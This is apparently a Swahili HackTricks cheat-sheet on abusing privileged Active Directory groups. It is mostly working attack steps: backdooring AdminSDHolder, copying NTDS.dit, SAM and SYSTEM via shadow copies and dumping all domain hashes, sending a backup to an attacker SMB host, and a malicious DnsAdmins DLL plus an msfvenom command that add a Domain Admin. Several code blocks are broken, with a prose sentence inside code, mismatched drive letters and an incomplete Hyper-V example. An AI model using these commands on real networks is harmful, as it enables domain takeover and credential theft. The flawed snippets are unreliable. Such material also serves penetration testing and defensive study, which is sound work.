# Vikundi vya Wenye Mamlaka

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Vikundi Maarufu vyenye Mamlaka ya Utawala

* **Waadiministrators**
* **Waadamin wa Kikoa**
* **Waadamin wa Kampuni**

## Waendeshaji wa Akaunti

Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo sio waadiministrators kwenye kikoa. Aidha, kinawezesha kuingia kwa ndani kwenye Kudhibiti Kikoa (DC).

Ili kutambua wanachama wa kikundi hiki, amri ifuatayo inatekelezwa:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Kuongeza watumiaji wapya kunaruhusiwa, pamoja na kuingia kwa ndani kwenye DC01.

## Kikundi cha AdminSDHolder

Orodha ya Udhibiti wa Upatikanaji (ACL) ya kikundi cha **AdminSDHolder** ni muhimu kwani inaweka ruhusa kwa "vikundi vilivyolindwa" vyote ndani ya Active Directory, ikiwa ni pamoja na vikundi vya hali ya juu. Mfumo huu unahakikisha usalama wa vikundi hivi kwa kuzuia mabadiliko yasiyoruhusiwa.

Mshambuliaji anaweza kutumia hili kwa kubadilisha ACL ya kikundi cha **AdminSDHolder**, kutoa ruhusa kamili kwa mtumiaji wa kawaida. Hii itampa mtumiaji huyo udhibiti kamili juu ya vikundi vyote vilivyolindwa. Ikiwa ruhusa za mtumiaji huyu zimebadilishwa au kuondolewa, zitarudishwa kiotomatiki ndani ya saa moja kutokana na muundo wa mfumo.

Amri za kukagua wanachama na kubadilisha ruhusa ni:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Kuna skripti inapatikana kuharakisha mchakato wa kurejesha: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Uanachama katika kikundi hiki unaruhusu kusoma vitu vilivyofutwa katika Active Directory, ambavyo vinaweza kufichua habari nyeti:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Upatikanaji wa Msimamizi wa Kikoa

Upatikanaji wa faili kwenye DC umefungwa isipokuwa mtumiaji ni sehemu ya kikundi cha `Server Operators`, ambacho hubadilisha kiwango cha upatikanaji.

### Kuongeza Uwezo wa Haki

Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kurekebisha ruhusa za huduma. Kikundi cha `Server Operators`, kwa mfano, kina udhibiti kamili juu ya huduma fulani, kuruhusu utekelezaji wa amri za kiholela na kuongeza uwezo wa haki.
```cmd
C:\> .\PsService.exe security AppReadiness
```
Amri hii inaonyesha kuwa `Server Operators` wana ufikiaji kamili, kuruhusu ujanja wa huduma kwa mamlaka zilizoongezeka.

## Waendeshaji wa Nakala za Hifadhi

Uanachama katika kikundi cha `Backup Operators` hutoa ufikiaji kwa mfumo wa faili wa `DC01` kutokana na mamlaka za `SeBackup` na `SeRestore`. Mamlaka hizi huruhusu uwezo wa kupitisha folda, kuorodhesha, na kunakili faili, hata bila idhini wazi, kwa kutumia bendera ya `FILE_FLAG_BACKUP_SEMANTICS`. Kutumia hati maalum ni muhimu kwa mchakato huu.

Ili kuorodhesha wanachama wa kikundi, tekeleza:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Shambulizi la Ndani

Kuimarisha mamlaka haya kwa ndani, hatua zifuatazo zinatumika:

1. Ingiza maktaba muhimu:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Wezesha na thibitisha `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Pata na nakili faili kutoka kwenye folda zilizozuiwa, kwa mfano:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Shambulizi la AD

Upatikanaji wa moja kwa moja kwenye mfumo wa faili wa Domain Controller unaruhusu wizi wa database ya `NTDS.dit`, ambayo ina hash zote za NTLM kwa watumiaji na kompyuta za kikoa.

#### Kutumia diskshadow.exe

1. Unda nakala ya kivuli ya diski ya `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Nakili `NTDS.dit` kutoka kwa nakala ya kivuli:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Badilisha, tumia `robocopy` kwa nakala ya faili:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Chukua `SYSTEM` na `SAM` ili kupata hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pata hash zote kutoka kwenye `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Kutumia wbadmin.exe

1. Weka mfumo wa faili wa NTFS kwa seva ya SMB kwenye kifaa cha mshambuliaji na weka siri za SMB kwenye kifaa cha lengo.
2. Tumia `wbadmin.exe` kwa ajili ya kuhifadhi mfumo na kuchota `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Kwa onyesho la vitendo, angalia [VIDEO YA ONYESHO NA IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Wanachama wa kikundi cha **DnsAdmins** wanaweza kutumia mamlaka yao kuweka DLL yoyote na mamlaka ya SYSTEM kwenye seva ya DNS, mara nyingi iliyoandaliwa kwenye Wadhibiti wa Kikoa. Uwezo huu unaruhusu uwezekano mkubwa wa uvamizi.

Kutaja wanachama wa kikundi cha DnsAdmins, tumia:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Tekeleza DLL yoyote

Wanachama wanaweza kufanya seva ya DNS iweke DLL yoyote (kutoka kwenye kompyuta au kwenye sehemu ya mbali) kwa kutumia amri kama vile:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Kuanzisha tena huduma ya DNS (ambayo inaweza kuhitaji ruhusa za ziada) ni muhimu ili DLL iweze kupakia:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Kwa maelezo zaidi kuhusu njia hii ya shambulio, tazama ired.team.

#### Mimilib.dll
Pia ni rahisi kutumia mimilib.dll kwa utekelezaji wa amri, kwa kubadilisha ili itekeleze amri maalum au reverse shells. [Angalia chapisho hili](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) kwa maelezo zaidi.

### WPAD Rekodi kwa MitM
DnsAdmins wanaweza kudanganya rekodi za DNS ili kufanya mashambulio ya Man-in-the-Middle (MitM) kwa kuunda rekodi ya WPAD baada ya kuzima orodha ya kuzuia maswali ya ulimwengu. Zana kama Responder au Inveigh zinaweza kutumika kwa kudanganya na kukamata trafiki ya mtandao.

### Wasomaji wa Kumbukumbu za Matukio
Wanachama wanaweza kupata ufikiaji wa kumbukumbu za matukio, ambapo wanaweza kupata habari nyeti kama vile nywila za wazi au maelezo ya utekelezaji wa amri:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Ubadilishaji wa Ruhusa za Windows za Kubadilishana
Kikundi hiki kinaweza kubadilisha DACLs kwenye kipengele cha kikoa, kwa uwezekano wa kutoa ruhusa za DCSync. Mbinu za kuongeza mamlaka kwa kutumia kikundi hiki zimefafanuliwa kwa undani katika hazina ya GitHub ya Kubadilishana-AD-Privesc.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Wamiliki wa Hyper-V
Wamiliki wa Hyper-V wana ufikiaji kamili wa Hyper-V, ambao unaweza kutumiwa kudhibiti Wadhibiti wa Kikoa vilivyovirtualishwa. Hii ni pamoja na kuiga DC za moja kwa moja na kuchukua NTLM hashes kutoka faili ya NTDS.dit.

### Mfano wa Udukuzi
Mozilla Maintenance Service ya Firefox inaweza kutumiwa na Wamiliki wa Hyper-V kutekeleza amri kama SYSTEM. Hii inahusisha kuunda kiunga ngumu kwa faili ya SYSTEM iliyolindwa na kuiweka na programu mbaya:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
**Maelezo: Uchunguzi wa Hard link umepunguzwa katika sasisho za hivi karibuni za Windows.**

## Usimamizi wa Shirika

Katika mazingira ambapo **Microsoft Exchange** imeanzishwa, kuna kikundi maalum kinachojulikana kama **Usimamizi wa Shirika** ambacho kina uwezo mkubwa. Kikundi hiki kina **ruhusa ya kufikia sanduku la barua za watumiaji wote wa kikoa** na kinadumisha **udhibiti kamili juu ya Kitengo cha Shirika cha 'Microsoft Exchange Security Groups'**. Udhibiti huu ni pamoja na kikundi cha **`Exchange Windows Permissions`**, ambacho kinaweza kutumiwa kwa ajili ya kuongeza mamlaka.

### Uchumi wa Mamlaka na Amri

#### Waendeshaji wa Uchapishaji
Wanachama wa kikundi cha **Waendeshaji wa Uchapishaji** wana haki kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawaruhusu **kuingia kwenye mfumo wa Domain Controller**, kuuzima, na kusimamia printers. Ili kutumia mamlaka haya, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na uwezo, ni lazima kuepuka Udhibiti wa Akaunti ya Mtumiaji (UAC).

Kutaja wanachama wa kikundi hiki, tumia amri ifuatayo ya PowerShell:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Kwa mbinu za kudukua zaidi zinazohusiana na **`SeLoadDriverPrivilege`**, mtu anapaswa kushauriana na rasilimali maalum za usalama.

#### Watumiaji wa Mbali wa Desktop
Wanachama wa kikundi hiki wanapewa ufikiaji kwenye PC kupitia Itifaki ya Mbali ya Desktop (RDP). Kwa kuchunguza wanachama hawa, amri za PowerShell zinapatikana:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Maelezo zaidi kuhusu kuchexploitisha RDP yanaweza kupatikana katika rasilimali maalum za pentesting.

#### Watumiaji wa Usimamizi wa Mbali
Wanachama wanaweza kupata kompyuta kupitia **Windows Remote Management (WinRM)**. Uchunguzi wa wanachama hawa unafanikiwa kupitia:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Kwa mbinu za kudukua zinazohusiana na **WinRM**, ni lazima kushauriana na hati maalum.

#### Waendeshaji wa Seva
Kikundi hiki kina ruhusa ya kufanya mabadiliko mbalimbali kwenye Wadhibiti wa Kikoa, ikiwa ni pamoja na ruhusa za kuhifadhi na kurejesha nakala, kubadilisha wakati wa mfumo, na kuzima mfumo. Ili kupata orodha ya wanachama, tumia amri ifuatayo:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Marejeo <a href="#marejeo" id="marejeo"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
